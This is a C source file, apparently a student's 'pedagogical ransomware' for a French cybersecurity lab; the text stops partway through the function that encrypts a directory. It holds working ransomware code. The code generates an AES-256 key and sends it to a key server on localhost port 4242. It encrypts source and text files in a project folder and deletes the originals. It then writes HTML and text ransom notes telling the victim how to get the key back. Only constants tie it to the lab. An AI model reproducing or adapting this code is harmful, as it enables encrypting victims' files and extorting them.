#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/err.h>
#include <errno.h>
#include <stdarg.h>

#define PROJECT_DIR "/home/tic/Bureau/TP/Projet"
#define CHECK_INTERVAL 5        // Interval de vérification en secondes
#define ENCRYPTION_DELAY 60     // Délai avant chiffrement en secondes (30s pour les tests, 3600s pour 1h)
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 4242
#define KEY_SIZE 32             // Taille de la clé AES-256 (32 octets)
#define IV_SIZE 16              // Taille du vecteur d'initialisation (16 octets)
#define BUFFER_SIZE 4096
#define KEY_FILE "/home/tic/Bureau/TP/encryption_key.bin"

// Définitions pour le système de logs
#define LOG_FILE "/home/tic/Bureau/TP/ransomware_logs.txt"
#define LOG_LEVEL_ERROR   0
#define LOG_LEVEL_WARNING 1
#define LOG_LEVEL_INFO    2
#define LOG_LEVEL_DEBUG   3

// Niveau de log actuel (à définir selon vos besoins)
#define CURRENT_LOG_LEVEL LOG_LEVEL_INFO

// Structure pour stocker la clé et le vecteur d'initialisation
typedef struct {
    unsigned char key[KEY_SIZE];
    unsigned char iv[IV_SIZE];
} CryptoParams;

// Fonction pour ajouter une entrée au fichier de log
void log_entry(int level, const char *component, const char *message) {
    if (level > CURRENT_LOG_LEVEL) {
        return; // Ne pas enregistrer les messages de niveau inférieur à celui configuré
    }
    
    FILE *log_file = fopen(LOG_FILE, "a");
    if (!log_file) {
        fprintf(stderr, "Impossible d'ouvrir le fichier de log %s\n", LOG_FILE);
        return;
    }
    
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    char timestamp[26];
    strftime(timestamp, 26, "%Y-%m-%d %H:%M:%S", tm_info);
    
    const char *level_str;
    switch (level) {
        case LOG_LEVEL_ERROR:
            level_str = "ERROR";
            break;
        case LOG_LEVEL_WARNING:
            level_str = "WARNING";
            break;
        case LOG_LEVEL_INFO:
            level_str = "INFO";
            break;
        case LOG_LEVEL_DEBUG:
            level_str = "DEBUG";
            break;
        default:
            level_str = "UNKNOWN";
    }
    
    fprintf(log_file, "[%s] [%s] [%s] %s\n", timestamp, level_str, component, message);
    fclose(log_file);
}

// Pour les messages qui nécessitent du formatage (printf-style)
void log_formatted(int level, const char *component, const char *format, ...) {
    if (level > CURRENT_LOG_LEVEL) {
        return;
    }
    
    char message[1024];
    va_list args;
    va_start(args, format);
    vsnprintf(message, sizeof(message), format, args);
    va_end(args);
    
    log_entry(level, component, message);
}

// Macros pour faciliter l'utilisation des logs
#define LOG_ERROR(component, message) log_entry(LOG_LEVEL_ERROR, component, message)
#define LOG_WARNING(component, message) log_entry(LOG_LEVEL_WARNING, component, message)
#define LOG_INFO(component, message) log_entry(LOG_LEVEL_INFO, component, message)
#define LOG_DEBUG(component, message) log_entry(LOG_LEVEL_DEBUG, component, message)
#define LOG_ERROR_F(component, format, ...) log_formatted(LOG_LEVEL_ERROR, component, format, __VA_ARGS__)
#define LOG_WARNING_F(component, format, ...) log_formatted(LOG_LEVEL_WARNING, component, format, __VA_ARGS__)
#define LOG_INFO_F(component, format, ...) log_formatted(LOG_LEVEL_INFO, component, format, __VA_ARGS__)
#define LOG_DEBUG_F(component, format, ...) log_formatted(LOG_LEVEL_DEBUG, component, format, __VA_ARGS__)

// Fonction pour afficher des données en format hexadécimal
void print_hex(const char *label, const unsigned char *data, size_t len) {
    printf("%s: ", label);
    for (size_t i = 0; i < len; i++) {
        printf("%02x", data[i]);
    }
    printf("\n");
}

// Fonction pour générer la clé et le vecteur d'initialisation
void generate_key_iv(CryptoParams *params) {
    if (RAND_bytes(params->key, KEY_SIZE) != 1) {
        LOG_ERROR("Ransomware", "Erreur lors de la génération de la clé");
        fprintf(stderr, "Erreur lors de la génération de la clé\n");
        exit(EXIT_FAILURE);
    }
    
    if (RAND_bytes(params->iv, IV_SIZE) != 1) {
        LOG_ERROR("Ransomware", "Erreur lors de la génération de l'IV");
        fprintf(stderr, "Erreur lors de la génération de l'IV\n");
        exit(EXIT_FAILURE);
    }
    
    LOG_INFO("Ransomware", "Clé et IV générés avec succès");
}

// Fonction pour sauvegarder la clé et l'IV dans un fichier local
int save_key_iv_to_file(CryptoParams *params) {
    FILE *key_file = fopen(KEY_FILE, "wb");
    if (!key_file) {
        LOG_ERROR_F("Ransomware", "Erreur lors de l'ouverture du fichier %s pour l'écriture", KEY_FILE);
        perror("Erreur lors de l'ouverture du fichier pour l'écriture");
        return 0;
    }
    
    size_t written_key = fwrite(params->key, 1, KEY_SIZE, key_file);
    size_t written_iv = fwrite(params->iv, 1, IV_SIZE, key_file);
    
    fclose(key_file);
    
    if (written_key != KEY_SIZE || written_iv != IV_SIZE) {
        LOG_ERROR("Ransomware", "Erreur lors de l'écriture dans le fichier");
        fprintf(stderr, "Erreur lors de l'écriture dans le fichier\n");
        return 0;
    }
    
    LOG_INFO_F("Ransomware", "Clé et IV sauvegardés localement dans %s", KEY_FILE);
    return 1;
}

// Fonction pour vérifier si un fichier doit être chiffré
int should_encrypt_file(const char *filename) {
    // Liste des extensions à chiffrer
    const char *extensions[] = {".txt", ".md", ".c", ".h", ".cpp", ".py", ".java", ".html", ".css", ".js"};
    int num_extensions = sizeof(extensions) / sizeof(extensions[0]);
    
    // Ne pas chiffrer les fichiers déjà chiffrés ou le fichier de rançon
    if (strstr(filename, ".enc") || strcmp(filename, "RANÇON.txt") == 0 || 
        strcmp(filename, "RANCON.txt") == 0 || strcmp(filename, "RANCON.html") == 0) {
        return 0;
    }
    
    // Vérifier les extensions
    for (int i = 0; i < num_extensions; i++) {
        if (strstr(filename, extensions[i])) {
            return 1;
        }
    }
    
    return 0;
}

// Fonction pour chiffrer un fichier avec AES-256-CBC
int encrypt_file(const char *input_file, const char *output_file, CryptoParams *params) {
    FILE *ifp, *ofp;
    EVP_CIPHER_CTX *ctx;
    unsigned char in_buf[BUFFER_SIZE], out_buf[BUFFER_SIZE + EVP_MAX_BLOCK_LENGTH];
    int in_len, out_len, final_len;
    
    // Ouvrir les fichiers
    ifp = fopen(input_file, "rb");
    if (!ifp) {
        LOG_ERROR_F("Ransomware", "Erreur lors de l'ouverture du fichier %s", input_file);
        fprintf(stderr, "Erreur lors de l'ouverture du fichier %s\n", input_file);
        return 0;
    }
    
    ofp = fopen(output_file, "wb");
    if (!ofp) {
        fclose(ifp);
        LOG_ERROR_F("Ransomware", "Erreur lors de la création du fichier %s", output_file);
        fprintf(stderr, "Erreur lors de la création du fichier %s\n", output_file);
        return 0;
    }
    
    // Créer et initialiser le contexte de chiffrement
    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        fclose(ifp);
        fclose(ofp);
        LOG_ERROR("Ransomware", "Erreur lors de la création du contexte de chiffrement");
        fprintf(stderr, "Erreur lors de la création du contexte de chiffrement\n");
        return 0;
    }
    
    // Initialiser l'opération de chiffrement
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, params->key, params->iv) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        fclose(ifp);
        fclose(ofp);
        LOG_ERROR("Ransomware", "Erreur lors de l'initialisation du chiffrement");
        fprintf(stderr, "Erreur lors de l'initialisation du chiffrement\n");
        return 0;
    }
    
    // Chiffrer le fichier par blocs
    while ((in_len = fread(in_buf, 1, BUFFER_SIZE, ifp)) > 0) {
        if (EVP_EncryptUpdate(ctx, out_buf, &out_len, in_buf, in_len) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            fclose(ifp);
            fclose(ofp);
            LOG_ERROR("Ransomware", "Erreur lors du chiffrement");
            fprintf(stderr, "Erreur lors du chiffrement\n");
            return 0;
        }
        
        fwrite(out_buf, 1, out_len, ofp);
    }
    
    // Finaliser l'opération de chiffrement
    if (EVP_EncryptFinal_ex(ctx, out_buf, &final_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        fclose(ifp);
        fclose(ofp);
        LOG_ERROR("Ransomware", "Erreur lors de la finalisation du chiffrement");
        fprintf(stderr, "Erreur lors de la finalisation du chiffrement\n");
        return 0;
    }
    
    fwrite(out_buf, 1, final_len, ofp);
    
    // Nettoyer
    EVP_CIPHER_CTX_free(ctx);
    fclose(ifp);
    fclose(ofp);
    
    LOG_INFO_F("Ransomware", "Fichier chiffré avec succès: %s", input_file);
    return 1;
}

// Fonction pour envoyer la clé et le vecteur d'initialisation au serveur
int send_key_iv_to_server(CryptoParams *params) {
    int sock = 0;
    struct sockaddr_in serv_addr;
    
    LOG_INFO_F("Ransomware", "Tentative de connexion au serveur %s:%d", SERVER_IP, SERVER_PORT);
    
    // Créer le socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        LOG_ERROR("Ransomware", "Erreur lors de la création du socket");
        fprintf(stderr, "Erreur lors de la création du socket\n");
        return 0;
    }
    
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(SERVER_PORT);
    
    // Convertir l'adresse IP
    if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0) {
        LOG_ERROR("Ransomware", "Adresse invalide / non supportée");
        fprintf(stderr, "Adresse invalide / non supportée\n");
        close(sock);
        return 0;
    }
    
    // Se connecter au serveur
    printf("Tentative de connexion au serveur %s:%d...\n", SERVER_IP, SERVER_PORT);
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        LOG_ERROR("Ransomware", "Connexion au serveur échouée");
        fprintf(stderr, "Connexion au serveur échouée\n");
        close(sock);
        
        // Si la connexion échoue, sauvegarder la clé et l'IV localement
        LOG_INFO("Ransomware", "Sauvegarde de la clé et de l'IV en local comme solution de secours");
        printf("Sauvegarde de la clé et de l'IV en local comme solution de secours...\n");
        if (save_key_iv_to_file(params)) {
            LOG_INFO("Ransomware", "Clé et IV sauvegardés localement avec succès");
            printf("Clé et IV sauvegardés localement avec succès.\n");
            return 1;  // Considérer comme un succès même si le serveur n'est pas accessible
        }
        return 0;
    }
    
    LOG_INFO("Ransomware", "Connexion au serveur établie");
    
    // Indiquer que c'est le ransomware qui envoie la clé (mode "STORE")
    char mode[] = "STORE";
    send(sock, mode, strlen(mode), 0);
    
    // Recevoir l'accusé de réception
    char buffer[32];
    recv(sock, buffer, 32, 0);
    
    LOG_INFO("Ransomware", "Envoi de la clé et du vecteur d'initialisation");
    
    // Envoyer la clé et le vecteur d'initialisation
    int total_sent = 0;
    int remaining = KEY_SIZE;
    const unsigned char *key_ptr = params->key;
    
    printf("Envoi de la clé (%d octets)...\n", KEY_SIZE);
    while (total_sent < KEY_SIZE) {
        int bytes_sent = send(sock, key_ptr + total_sent, remaining, 0);
        if (bytes_sent <= 0) {
            LOG_ERROR("Ransomware", "Erreur lors de l'envoi de la clé");
            perror("Erreur lors de l'envoi de la clé");
            close(sock);
            return 0;
        }
        total_sent += bytes_sent;
        remaining -= bytes_sent;
    }
    
    // Envoyer l'IV
    total_sent = 0;
    remaining = IV_SIZE;
    const unsigned char *iv_ptr = params->iv;
    
    printf("Envoi de l'IV (%d octets)...\n", IV_SIZE);
    while (total_sent < IV_SIZE) {
        int bytes_sent = send(sock, iv_ptr + total_sent, remaining, 0);
        if (bytes_sent <= 0) {
            LOG_ERROR("Ransomware", "Erreur lors de l'envoi de l'IV");
            perror("Erreur lors de l'envoi de l'IV");
            close(sock);
            return 0;
        }
        total_sent += bytes_sent;
        remaining -= bytes_sent;
    }
    
    LOG_INFO("Ransomware", "Clé et IV envoyés au serveur avec succès");
    
    // Sauvegarder également la clé et l'IV localement comme secours
    save_key_iv_to_file(params);
    
    // Fermer la connexion
    close(sock);
    return 1;
}

// Fonction pour créer le fichier de rançon HTML
void create_ransom_note() {
    char ransom_file[256];
    snprintf(ransom_file, sizeof(ransom_file), "%s/RANCON.html", PROJECT_DIR);
    
    FILE *fp = fopen(ransom_file, "w");
    if (!fp) {
        LOG_ERROR_F("Ransomware", "Erreur lors de la création du fichier de rançon %s", ransom_file);
        fprintf(stderr, "Erreur lors de la création du fichier de rançon\n");
        return;
    }
    
    // Créer une page HTML moderne avec animation
    fprintf(fp, "<!DOCTYPE html>\n");
    fprintf(fp, "<html lang=\"fr\">\n");
    fprintf(fp, "<head>\n");
    fprintf(fp, "    <meta charset=\"UTF-8\">\n");
    fprintf(fp, "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n");
    fprintf(fp, "    <title>FICHIERS CHIFFRÉS</title>\n");
    fprintf(fp, "    <style>\n");
    fprintf(fp, "        body {\n");
    fprintf(fp, "            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;\n");
    fprintf(fp, "            background-color: #000;\n");
    fprintf(fp, "            color: #fff;\n");
    fprintf(fp, "            margin: 0;\n");
    fprintf(fp, "            padding: 40px;\n");
    fprintf(fp, "            line-height: 1.6;\n");
    fprintf(fp, "        }\n");
    fprintf(fp, "        .container {\n");
    fprintf(fp, "            max-width: 800px;\n");
    fprintf(fp, "            margin: 0 auto;\n");
    fprintf(fp, "            background-color: #111;\n");
    fprintf(fp, "            padding: 30px;\n");
    fprintf(fp, "            border-radius: 10px;\n");
    fprintf(fp, "            box-shadow: 0 0 20px rgba(255, 0, 0, 0.6);\n");
    fprintf(fp, "            animation: pulse 2s infinite;\n");
    fprintf(fp, "        }\n");
    fprintf(fp, "        @keyframes pulse {\n");
    fprintf(fp, "            0%% { box-shadow: 0 0 20px rgba(255, 0, 0, 0.6); }\n");
    fprintf(fp, "            50%% { box-shadow: 0 0 40px rgba(255, 0, 0, 0.8); }\n");
    fprintf(fp, "            100%% { box-shadow: 0 0 20px rgba(255, 0, 0, 0.6); }\n");
    fprintf(fp, "        }\n");
    fprintf(fp, "        h1 {\n");
    fprintf(fp, "            color: #ff0000;\n");
    fprintf(fp, "            text-align: center;\n");
    fprintf(fp, "            font-size: 2.5em;\n");
    fprintf(fp, "            margin-bottom: 30px;\n");
    fprintf(fp, "            text-shadow: 0 0 10px rgba(255, 0, 0, 0.7);\n");
    fprintf(fp, "        }\n");
    fprintf(fp, "        .skull {\n");
    fprintf(fp, "            text-align: center;\n");
    fprintf(fp, "            font-size: 80px;\n");
    fprintf(fp, "            margin: 20px 0;\n");
    fprintf(fp, "            animation: rotate 5s infinite;\n");
    fprintf(fp, "        }\n");
    fprintf(fp, "        @keyframes rotate {\n");
    fprintf(fp, "            0%% { transform: rotateY(0deg); }\n");
    fprintf(fp, "            50%% { transform: rotateY(180deg); }\n");
    fprintf(fp, "            100%% { transform: rotateY(360deg); }\n");
    fprintf(fp, "        }\n");
    fprintf(fp, "        .warning {\n");
    fprintf(fp, "            background-color: rgba(255, 0, 0, 0.2);\n");
    fprintf(fp, "            padding: 15px;\n");
    fprintf(fp, "            border-left: 5px solid #ff0000;\n");
    fprintf(fp, "            margin: 20px 0;\n");
    fprintf(fp, "        }\n");
    fprintf(fp, "        .steps {\n");
    fprintf(fp, "            background-color: rgba(0, 0, 0, 0.5);\n");
    fprintf(fp, "            padding: 20px;\n");
    fprintf(fp, "            border-radius: 5px;\n");
    fprintf(fp, "        }\n");
    fprintf(fp, "        .step {\n");
    fprintf(fp, "            margin-bottom: 15px;\n");
    fprintf(fp, "            padding-left: 20px;\n");
    fprintf(fp, "            position: relative;\n");
    fprintf(fp, "        }\n");
    fprintf(fp, "        .step:before {\n");
    fprintf(fp, "            content: '';\n");
    fprintf(fp, "            position: absolute;\n");
    fprintf(fp, "            left: 0;\n");
    fprintf(fp, "            top: 8px;\n");
    fprintf(fp, "            width: 10px;\n");
    fprintf(fp, "            height: 10px;\n");
    fprintf(fp, "            background-color: #ff0000;\n");
    fprintf(fp, "            border-radius: 50%%;\n");
    fprintf(fp, "        }\n");
    fprintf(fp, "        .step-number {\n");
    fprintf(fp, "            color: #ff0000;\n");
    fprintf(fp, "            font-weight: bold;\n");
    fprintf(fp, "            margin-right: 5px;\n");
    fprintf(fp, "        }\n");
    fprintf(fp, "        .highlight {\n");
    fprintf(fp, "            color: #ff6b6b;\n");
    fprintf(fp, "            font-weight: bold;\n");
    fprintf(fp, "        }\n");
    fprintf(fp, "        .footer {\n");
    fprintf(fp, "            text-align: center;\n");
    fprintf(fp, "            margin-top: 40px;\n");
    fprintf(fp, "            font-size: 0.9em;\n");
    fprintf(fp, "            color: #aaa;\n");
    fprintf(fp, "        }\n");
    fprintf(fp, "        .timer {\n");
    fprintf(fp, "            text-align: center;\n");
    fprintf(fp, "            font-size: 2em;\n");
    fprintf(fp, "            margin: 20px 0;\n");
    fprintf(fp, "            color: #ff0000;\n");
    fprintf(fp, "        }\n");
    fprintf(fp, "        hr {\n");
    fprintf(fp, "            border: none;\n");
    fprintf(fp, "            height: 1px;\n");
    fprintf(fp, "            background: linear-gradient(to right, transparent, #ff0000, transparent);\n");
    fprintf(fp, "            margin: 30px 0;\n");
    fprintf(fp, "        }\n");
    fprintf(fp, "    </style>\n");
    fprintf(fp, "</head>\n");
    fprintf(fp, "<body>\n");
    fprintf(fp, "    <div class=\"container\">\n");
    fprintf(fp, "        <h1>❌ FICHIERS CHIFFRÉS ❌</h1>\n");
    fprintf(fp, "        <div class=\"skull\">💀</div>\n");
    fprintf(fp, "        <div class=\"warning\">\n");
    fprintf(fp, "            <p>Vos fichiers dans ce dossier ont été chiffrés par <span class=\"highlight\">ProManager</span>, car la date limite de remise du projet a été dépassée.</p>\n");
    fprintf(fp, "            <p>Chaque fichier a été chiffré en <span class=\"highlight\">AES-256</span> avec une clé unique.</p>\n");
    fprintf(fp, "            <p><strong>Ne tentez pas de modifier les fichiers <code>.enc</code>, vous risqueriez de les rendre irrécupérables.</strong></p>\n");
    fprintf(fp, "        </div>\n");
    fprintf(fp, "        <hr>\n");
    fprintf(fp, "        <h2>✅ Pour récupérer vos fichiers :</h2>\n");
    fprintf(fp, "        <div class=\"steps\">\n");
    fprintf(fp, "            <div class=\"step\">\n");
    fprintf(fp, "                <span class=\"step-number\">1.</span> Lancez le programme <code>client_decrypt</code> disponible dans le dossier TP/.\n");
    fprintf(fp, "            </div>\n");
    fprintf(fp, "            <div class=\"step\">\n");
    fprintf(fp, "                <span class=\"step-number\">2.</span> Connectez-vous au serveur de l'administration via l'adresse suivante:<br>\n");
    fprintf(fp, "                → Adresse : <span class=\"highlight\">127.0.0.1</span><br>\n");
    fprintf(fp, "                → Port : <span class=\"highlight\">4242</span>\n");
    fprintf(fp, "            </div>\n");
    fprintf(fp, "            <div class=\"step\">\n");
    fprintf(fp, "                <span class=\"step-number\">3.</span> Le serveur vous demandera une justification écrite.<br>\n");
    fprintf(fp, "                Rédigez un message d'excuse sincère (minimum 20 caractères).\n");
    fprintf(fp, "            </div>\n");
    fprintf(fp, "            <div class=\"step\">\n");
    fprintf(fp, "                <span class=\"step-number\">4.</span> Si vos excuses sont acceptées, vous recevrez automatiquement :<br>\n");
    fprintf(fp, "                - La clé de déchiffrement<br>\n");
    fprintf(fp, "                - Le vecteur d'initialisation (IV)\n");
    fprintf(fp, "            </div>\n");
    fprintf(fp, "            <div class=\"step\">\n");
    fprintf(fp, "                <span class=\"step-number\">5.</span> Le programme <code>client_decrypt</code> déchiffrera ensuite vos fichiers.\n");
    fprintf(fp, "            </div>\n");
    fprintf(fp, "        </div>\n");
    fprintf(fp, "        <hr>\n");
    fprintf(fp, "        <p>ℹ️ Si vous avez déjà présenté vos excuses, vous pouvez relancer <code>client_decrypt</code> directement.</p>\n");
    fprintf(fp, "        <p>📁 Fichiers chiffrés : tous les fichiers <code>.txt</code>, <code>.md</code>, <code>.c</code>, <code>.h</code>, etc.</p>\n");
    fprintf(fp, "        <div class=\"timer\">\n");
    fprintf(fp, "            ⏱️ Délai écoulé : %d secondes après la création du dossier Projet/\n", ENCRYPTION_DELAY);
    fprintf(fp, "        </div>\n");
    fprintf(fp, "        <hr>\n");
    fprintf(fp, "        <div class=\"footer\">\n");
    fprintf(fp, "            🔐 Ransomware pédagogique développé dans le cadre du TP cybersécurité\n");
    fprintf(fp, "        </div>\n");
    fprintf(fp, "    </div>\n");
    fprintf(fp, "<script>\n");
    fprintf(fp, "    // Animation pour les éléments\n");
    fprintf(fp, "    document.addEventListener('DOMContentLoaded', function() {\n");
    fprintf(fp, "        const elements = document.querySelectorAll('h1, .warning, .steps, .step');\n");
    fprintf(fp, "        elements.forEach((element, index) => {\n");
    fprintf(fp, "            element.style.opacity = '0';\n");
    fprintf(fp, "            element.style.transform = 'translateY(20px)';\n");
    fprintf(fp, "            element.style.transition = 'opacity 0.5s ease, transform 0.5s ease';\n");
    fprintf(fp, "            setTimeout(() => {\n");
    fprintf(fp, "                element.style.opacity = '1';\n");
    fprintf(fp, "                element.style.transform = 'translateY(0)';\n");
    fprintf(fp, "            }, 100 * index);\n");
    fprintf(fp, "        });\n");
    fprintf(fp, "    });\n");
    fprintf(fp, "</script>\n");
    fprintf(fp, "</body>\n");
    fprintf(fp, "</html>\n");
    
    fclose(fp);
    
    // Créer également un fichier texte de base au cas où l'utilisateur ne pourrait pas ouvrir le HTML
    snprintf(ransom_file, sizeof(ransom_file), "%s/RANCON.txt", PROJECT_DIR);
    
    fp = fopen(ransom_file, "w");
    if (!fp) {
        LOG_ERROR("Ransomware", "Erreur lors de la création du fichier de rançon texte");
        fprintf(stderr, "Erreur lors de la création du fichier de rançon texte\n");
        return;
    }
    
    fprintf(fp, "#########################################\n");
    fprintf(fp, "#        ❌  FICHIERS CHIFFRÉS  ❌       #\n");
    fprintf(fp, "#########################################\n\n");
    fprintf(fp, "Vos fichiers dans ce dossier ont été chiffrés par ProManager,\n");
    fprintf(fp, "car la date limite de remise du projet a été dépassée.\n\n");
    fprintf(fp, "Chaque fichier a été chiffré en AES-256 avec une clé unique.\n\n");
    fprintf(fp, "Ne tentez pas de modifier les fichiers `.enc`, vous risqueriez\n");
    fprintf(fp, "de les rendre irrécupérables.\n\n");
    fprintf(fp, "────────────────────────────────────────\n\n");
    fprintf(fp, "✅ Pour récupérer vos fichiers :\n\n");
    fprintf(fp, "1. Lancez le programme `client_decrypt` disponible dans le dossier TP/.\n\n");
    fprintf(fp, "2. Connectez-vous au serveur de l'administration via l'adresse suivante :\n");
    fprintf(fp, "   → Adresse : 127.0.0.1\n");
    fprintf(fp, "   → Port    : 4242\n\n");
    fprintf(fp, "3. Le serveur vous demandera une justification écrite.\n");
    fprintf(fp, "   Rédigez un message d'excuse sincère (minimum 20 caractères).\n\n");
    fprintf(fp, "4. Si vos excuses sont acceptées, vous recevrez automatiquement :\n");
    fprintf(fp, "   - La clé de déchiffrement\n");
    fprintf(fp, "   - Le vecteur d'initialisation (IV)\n\n");
    fprintf(fp, "5. Le programme `client_decrypt` déchiffrera ensuite vos fichiers.\n\n");
    fprintf(fp, "────────────────────────────────────────\n\n");
    fprintf(fp, "ℹ️ Si vous avez déjà présenté vos excuses,\n");
    fprintf(fp, "vous pouvez relancer `client_decrypt` directement.\n\n");
    fprintf(fp, "📁 Fichiers chiffrés : tous les fichiers `.txt`, `.md`, `.c`, `.h`, etc.\n\n");
    fprintf(fp, "⏱️ Délai écoulé : %d secondes après la création du dossier Projet/\n\n", ENCRYPTION_DELAY);
    fprintf(fp, "────────────────────────────────────────\n\n");
    fprintf(fp, "🔐 Ransomware pédagogique développé dans le cadre du TP cybersécurité\n");
    
    fclose(fp);
    
    LOG_INFO("Ransomware", "Fichiers de rançon HTML et TXT créés");
    printf("Fichiers de rançon HTML et TXT créés.\n");
}

// Fonction principale pour chiffrer tous les fichiers du dossier avec animation
void encrypt_directory(CryptoParams *params) {
    DIR *dir;
    struct dirent *entry;
    struct dirent **namelist;
    int n, i;
    
    LOG_INFO("Ransomware", "Début du processus de chiffrement");
    
    printf("\033[2J\033[1;1H"); // Effacer l'écran du terminal
    printf("\033[1;31m"); // Texte en rouge et gras
    
    printf("    _____                                                       \n");
    printf("   |  __ \\                                                      \n");
    printf("   | |__) | __ ___  |\\\\___/| __ _ _ __   __ _  __ _  ___ _ __  \n");
    printf("   |  ___/ '__/ _ \\ \\     / / _` | '_ \\ / _` |/ _` |/ _ \\ '__| \n");
    printf("   | |   | | | (_) | |___| | (_| | | | | (_| | (_| |  __/ |    \n");
    printf("   |_|   |_|  \\___/  \\___/  \\__,_|_| |_|\\__,_|\\__, |\\___|_|    \n");
    printf("                                               __/ |            \n");
    printf("                                              |___/             \n");
    printf("\033[0m"); // Réinitialiser le formatage du texte
    
    printf("\n\033[1;33m[!] Initialisation du processus de chiffrement...\033[0m\n\n");
    sleep(1);
    
    // Vérifier si le dossier existe
    dir = opendir(PROJECT_DIR);
    if (!dir) {
        LOG_ERROR_F("Ransomware", "Impossible d'ouvrir le dossier %s", PROJECT_DIR);
        fprintf(stderr, "\033[1;31m[X] Impossible d'ouvrir le dossier %s\033[0m\n", PROJECT_DIR);
        return;
    }
    closedir(dir);
    
    // Compter les fichiers éligibles pour afficher une barre de progression
    printf("\033[1;36m[*] Analyse des fichiers...\033[0m\n");
    sleep(1);
    
    int total_files = 0;
    int eligible_files = 0;
    
    n = scandir(PROJECT_DIR, &namelist, NULL, alphasort);
    if (n < 0) {
        LOG_ERROR("Ransomware", "Erreur lors du scan du répertoire");
        perror("scandir");
        return;
    }
    
    for (i = 0; i < n; i++) {
        // Ignorer les répertoires "." et ".."
        if (strcmp(namelist[i]->d_name, ".") == 0 || strcmp(namelist[i]->d_name, "..") == 0) {
            free(namelist[i]);
            continue;
        }
        
        // Construire le chemin complet du fichier
        char path[512];
        snprintf(path, sizeof(path), "%s/%s", PROJECT_DIR, namelist[i]->d_name);
        
        // Vérifier si c'est un fichier régulier
        struct stat path_stat;
        stat(path, &path_stat);
        
        if (S_ISREG(path_stat.st_mode)) {
            total_files++;
            
            if (should_encrypt_file(namelist[i]->d_name)) {
                eligible_files++;
            }
        }
        
        free(namelist[i]);
    }
    free(namelist);
    
    if (eligible_files == 0) {
        LOG_WARNING_F("Ransomware", "Aucun fichier à chiffrer trouvé dans %s", PROJECT_DIR);
        printf("\033[1;33m[!] Aucun fichier à chiffrer trouvé dans %s\033[0m\n", PROJECT_DIR);
        return;
    }
    
    LOG_INFO_F("Ransomware", "%d fichiers trouvés, dont %d éligibles au chiffrement", total_files, eligible_files);
    printf("\033[1;32m[+] %d fichiers trouvés, dont %d éligibles au chiffrement.\033[0m\n", 
           total_files, eligible_files);
    sleep(1);
    
    // Afficher la génération de clé/IV
    printf("\n\033[1;36m[*] Génération des clés de chiffrement...\033[0m\n");
    usleep(500000); // 0.5 secondes
    printf("    ⚙️  Algorithme: AES-256-CBC\n");
    usleep(300000);
    print_hex("    🔑 Clé (HEX)", params->key, KEY_SIZE);
    usleep(300000);
    print_hex("    🔄 IV (HEX) ", params->iv, IV_SIZE);
    usleep(300000);
    printf("\033[1;32m[+] Clés de chiffrement générées avec succès.\033[0m\n\n");
    sleep(1);
    
    // Début du chiffrement avec barre de progression
    printf("\033[1;36m[*] Début du chiffrement des fichiers dans %s\033[0m\n\n", PROJECT_DIR);
    LOG_INFO_F("Ransomware", "Début du chiffrement des fichiers dans %s", PROJECT_DIR);
    sleep(1);
    
    int encrypted_count = 0;
    int progress_bar_width = 40;
    
    // Rescanner le répertoire pour le chiffrement réel
    n = scandir(PROJECT_DIR, &namelist, NULL, alphasort);
    if (n < 0) {
        LOG_ERROR("Ransomware", "Erreur lors du scan du répertoire");
        perror("scandir");
        return;
    }
    
    for (i = 0; i < n; i++) {
        // Ignorer les répertoires "." et ".."
        if (strcmp(namelist[i]->d_name, ".") == 0 || strcmp(namelist[i]->d_name, "..") == 0) {
            free(namelist[i]);
            continue;
        }
        
        // Construire le chemin complet du fichier
        char input_path[512];
        snprintf(input_path, sizeof(input_path), "%s/%s", PROJECT_DIR, namelist[i]->d_name);
        
        // Vérifier si c'est un fichier régulier
        struct stat path_stat;
        stat(input_path, &path_stat);
        
        if (S_ISREG(path_stat.st_mode) && should_encrypt_file(namelist[i]->d_name)) {
            // Construire le chemin du fichier chiffré
            char output_path[1024]; // Plus grand tampon pour éviter les troncatures
            snprintf(output_path, sizeof(output_path), "%s.enc", input_path);
            
            // Animer le chiffrement
            printf("\r\033[K"); // Effacer la ligne
            printf("\033[1;33m[🔒] Chiffrement de: \033[0m%s ", namelist[i]->d_name);
            
            // Animation pendant le chiffrement
            fflush(stdout);
            
            // Chiffrer le fichier
            if (encrypt_file(input_path, output_path, params)) {
                // Supprimer le fichier original
                if (remove(input_path) != 0) {
                    LOG_ERROR_F("Ransomware", "Erreur lors de la suppression de %s", input_path);
                    fprintf(stderr, "\n\033[1;31m[X] Erreur lors de la suppression de %s\033[0m", input_path);
                }
                encrypted_count++;
                
                // Petit délai pour l'effet visuel
                usleep(200000); // 0.2 secondes
                
                // Mettre à jour la barre de progression
                float progress = (float)encrypted_count / eligible_files;
                int pos = progress * progress_bar_width;
                
                printf("\r\033[K"); // Effacer la ligne
                printf("\033[1;36m[");
                for (int j = 0; j < progress_bar_width; j++) {
                    if (j < pos) printf("\033[1;32m█\033[1;36m");
                    else printf(" ");
                }
                printf("] %.1f%% (%d/%d)\033[0m", progress * 100, encrypted_count, eligible_files);
                fflush(stdout);
            }
        }
        
        free(namelist[i]);
    }
    free(namelist);
    
    LOG_INFO_F("Ransomware", "Chiffrement terminé! %d fichiers chiffrés", encrypted_count);
    printf("\n\n\033[1;32m[✓] Chiffrement terminé! %d fichiers chiffrés.\033[0m\n", encrypted_count);
    sleep(1);
    
    // Création du fichier de rançon
    printf("\n\033[1;36m[*] Création du message de rançon...\033[0m\n");
    usleep(500000);
    create_ransom_note();
    printf("\033[1;32m[✓] Message de rançon créé avec succès.\033[0m\n");
